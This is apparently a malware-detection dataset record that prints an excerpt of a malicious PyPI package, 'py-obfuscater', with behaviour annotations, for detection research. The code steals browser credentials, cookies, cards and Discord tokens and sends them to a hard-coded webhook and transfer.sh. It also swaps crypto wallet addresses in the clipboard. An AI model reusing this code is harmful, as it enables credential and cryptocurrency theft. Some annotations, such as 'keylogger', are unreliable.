{
  "metadata": {
    "package_name": "py-obfuscater-1.0.2",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/py-obfuscater-1.0.2.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/py-obfuscater-1.0.2.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport requests\nimport httpx\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport psutil\nimport base64\nimport ctypes\nimport time\nimport pyperclip\nimport win32gui\nimport win32con\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# --- Malicious configuration and initial exfiltration ---\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://discord.com/api/webhooks/1104290142912528457/TVOxheeA7nJpxR8ojtb8CsoHPjQx0OFpnr-fuecUZQ5ngkNiw5OFsBK2EItGRWra1DSV\", json=data)\n\n__config__ = {\n    \"yourwebhookurl\": \"https://k8c7nxg6riaq9nueln6wjd.hooks.webhookrelay.com/\",\n    \"bc_injection_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    ...\n}\n\n# --- Malicious class for clipboard crypto address swapping (crypto-clipper) ---\nclass auto_copy_wallet(...):\n    ...\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search(\"^0x[a-fA-F0-9]{40}$\", clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search(\n                \"^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search(\"addr1[a-z0-9]+\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search(\"/X[1-9A-HJ-NP-Za-km-z]{33}$/g\", clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search(\"/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g\", clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    ...\n\n# --- Malicious class for credential, token, and file theft ---\nclass first_function_bc(...):\n    ...\n    async def init(self):\n        ...\n        # Steal browser data, Discord tokens, cookies, passwords, history, credit cards\n        ...\n        for name, path in self.browsers.items():\n            if not os.path.isdir(path):\n                continue\n            self.masterkey = self.mykey_gtm(path + \"\\\\Local State\")\n            self.funcs = [\n                self.steal_cookies2,\n                self.steal_history2,\n                self.steal_passwords2,\n                self.steal_cc2,\n            ]\n            for profile in self.profiles:\n                for func in self.funcs:\n                    try:\n                        func(name, path, profile)\n                    except:\n                        pass\n        ...\n        # Exfiltrate data\n        self.natify_matched_tokens()\n        await self.disco_injection()\n        self.ping_on_running()\n        self.finished_bc()\n    ...\n    def find_bctoken(self):\n        # Steal Discord tokens from various browsers and validate them\n        ...\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            ...\n            for filname in os.listdir(path):\n                if filname[-3:] not in [\"log\", \"ldb\"]:\n                    continue\n                for line in [\n                    x.strip()\n                    for x in open(f\"{path}\\\\{filname}\", errors=\"ignore\").readlines()\n                    if x.strip()\n                ]:\n                    for token in re.findall(self.regex, line):\n                        try:\n                            r = requests.get(\n                                self.baseurl,\n                                headers={\n                                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                    \"Content-Type\": \"application/json\",\n                                    \"Authorization\": token,\n                                },\n                            )\n                        except Exception:\n                            pass\n                        if r.status_code == 200:\n                            uid = r.json()[\"id\"]\n                            if uid not in self.bc_id:\n                                self.tokens.append(token)\n                                self.bc_id.append(uid)\n        ...\n    def steal_passwords2(self, name: str, path: str, profile: str):\n        # Steal passwords from browser profile\n        ...\n    def steal_cookies2(self, name: str, path: str, profile: str):\n        # Steal cookies from browser profile\n        ...\n    def steal_passwords(self):\n        # Steal Chrome passwords\n        ...\n    def steal_cookies(self):\n        # Steal Chrome cookies\n        ...\n    def steal_history2(self, name: str, path: str, profile: str):\n        # Steal browser history\n        ...\n    def steal_cc2(self, name: str, path: str, profile: str):\n        # Steal credit card data\n        ...\n    def finished_bc(self):\n        # Zip and exfiltrate all stolen data\n        ...\n        _zipfile = ntpath.join(self.appdata, f\"BC-[{login_info}].zip\")\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        ...\n        with open(_zipfile, \"rb\") as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json=embed)\n                httpx.post(self.discord_webhook, files={\"upload_file\": f})\n        os.remove(_zipfile)\n    ...\n\n# --- Malicious functions for mass browser data theft and exfiltration ---\ndef Find_Passw(path, arg):\n    ...\n    # Steal passwords from browser database, decrypt, and collect for exfiltration\n    ...\ndef Get_Bc_Cook(path, arg):\n    ...\n    # Steal cookies from browser database, decrypt, and collect for exfiltration\n    ...\ndef upload(name, tk=\"\"):\n    ...\n    # Exfiltrate files and data to attacker's webhook\n    ...\ndef bc_Gather_All():\n    ...\n    # Orchestrate browser data theft and exfiltration for multiple browsers\n    ...\ndef UploadTo_Anon(path):\n    try:\n        files = {\"file\": (path, open(path, mode=\"rb\"))}\n        ...\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef check_spec_bc():\n    ...\n    # Search for files with sensitive keywords on Desktop, Downloads, Documents, upload to attacker\n    ...\n\n# --- Main execution: run all malicious actions ---\nbc_Gather_All()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = check_spec_bc()\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext += f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a) - 1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "COMPUTERNAME",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://discord.com/api/webhooks/1104290142912528457/TVOxheeA7nJpxR8ojtb8CsoHPjQx0OFpnr-fuecUZQ5ngkNiw5OFsBK2EItGRWra1DSV",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
              "object_description": "Regular expression for cryptocurrency address detection",
              "object_id": "cryptocurrency_address_regex",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_btc",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace clipboard content with preset address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "^0x[a-fA-F0-9]{40}$",
              "object_description": "Regular expression for cryptocurrency address detection",
              "object_id": "cryptocurrency_address_regex",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_eth",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace clipboard content with preset address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "self.mykey_gtm()",
              "action_description": "Retrieves and decrypts master key from local state",
              "action_id": "get_master_key",
              "object": "path + \"\\Local State\"",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "self.steal_cookies2()",
              "action_description": "Retrieve browser cookies",
              "action_id": "get_browser_cookies",
              "object": "name, path, profile",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Extract browser cookies data",
              "intention_id": "extract_browser_cookies_data"
            },
            {
              "action_api": "self.steal_history2()",
              "action_description": "Collect browser information",
              "action_id": "collect_browser_info",
              "object": "name, path, profile",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Query browser history data",
              "intention_id": "query_browser_history"
            },
            {
              "action_api": "self.steal_passwords2()",
              "action_description": "Retrieves Chrome password value",
              "action_id": "get_chrome_password",
              "object": "name, path, profile",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Extract browser password data",
              "intention_id": "extract_browser_password_data"
            },
            {
              "action_api": "self.steal_cc2()",
              "action_description": "Query credit card data",
              "action_id": "query_credit_card_data",
              "object": "name, path, profile",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Decrypt card number",
              "intention_id": "decrypt_card_number"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f\"{path}\\{filname}\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract encrypted Discord tokens",
              "intention_id": "extract_encrypted_discord_tokens"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.baseurl",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Check validity of Discord token",
              "intention_id": "check_authentication_cookie"
            },
            {
              "action_api": "r.status_code",
              "action_description": "Retrieves HTTP response status code",
              "action_id": "get_http_status",
              "object": "",
              "object_description": "HTTP status code",
              "object_id": "status_code",
              "intention_description": "Determine presence of valid authentication",
              "intention_id": "determine_valid_authentication_presence"
            },
            {
              "action_api": "r.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Opens ZIP archive for writing",
              "action_id": "open_zip_write",
              "object": "_zipfile, \"w\", zipfile.ZIP_DEFLATED",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "_zipfile, \"rb\"",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.discord_webhook",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.discord_webhook, files={\"upload_file\": f}",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "_zipfile",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://transfer.sh/",
              "object_description": "File sharing endpoint",
              "object_id": "file_sharing_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=auto_copy_wallet().run",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "auto.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            }
          ]
        }
      ]
    }
  ]
}